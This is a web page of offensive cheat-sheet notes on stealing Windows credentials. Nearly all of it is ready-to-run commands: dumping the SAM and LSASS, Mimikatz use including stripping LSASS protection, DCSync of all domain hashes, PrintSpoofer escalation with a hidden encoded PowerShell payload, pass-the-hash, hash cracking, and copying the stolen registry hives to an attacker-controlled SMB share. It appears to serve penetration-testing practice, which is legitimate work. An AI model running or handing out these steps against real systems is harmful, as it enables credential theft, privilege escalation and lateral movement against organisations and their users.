---
layout: page
title: "Windows Credentials"
---

# Windows Credentials

Local hashes live in the SAM database, domain credentials cache in LSASS. Both require local admin or SYSTEM. The goal is a hash you can crack or pass directly.

## SAM Database

```powershell
# Create VSS snapshot and copy locked files
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system

# Or save directly from registry (requires admin)
reg save HKLM\sam C:\users\public\sam
reg save HKLM\system C:\users\public\system
```

```shell
# Decrypt offline (Kali)
impacket-secretsdump -sam sam -system system LOCAL
```

## LSASS Dump

```powershell
# ProcDump (SysInternals)
.\procdump.exe -ma lsass.exe lsass.dmp

# Task Manager: Details tab -> lsass.exe -> Create dump file
# Saved to %TEMP%\lsass.DMP
```

Parse the dump on any matching Windows version: no elevation needed on the parsing machine:

```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## Mimikatz Live Dump

```powershell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

If LSASS runs as PPL:

```powershell
privilege::debug
!+                                    # load mimidrv.sys
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

## DCSync

```powershell
# Requires Domain Admin or delegated DCSync rights
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:corp1.com /user:krbtgt
lsadump::dcsync /domain:corp1.com /all /csv
```

## Token Impersonation (SeImpersonatePrivilege)

Accounts like Network Service and IIS AppPool have `SeImpersonatePrivilege` by default. Exploit the print spooler to force SYSTEM to connect to a named pipe:

```powershell
# Check privileges
whoami /priv

# PrintSpoofer: escalate from SeImpersonatePrivilege to SYSTEM
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "powershell -nop -w hidden -enc <base64>"
```

## Pass the Hash

```powershell
# Launch process in the context of a hash (Mimikatz)
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:cmd.exe

# xfreerdp PtH (from Kali)
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.1.10 /cert-ignore
```

## Crack NTLM Hashes

```shell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

## Exfil / Transfer

```shell
# Kali: host SMB share
impacket-smbserver share . -smb2support

# Windows: map and copy
net use \\192.168.45.10\share
copy sam \\192.168.45.10\share\sam
copy system \\192.168.45.10\share\system
```
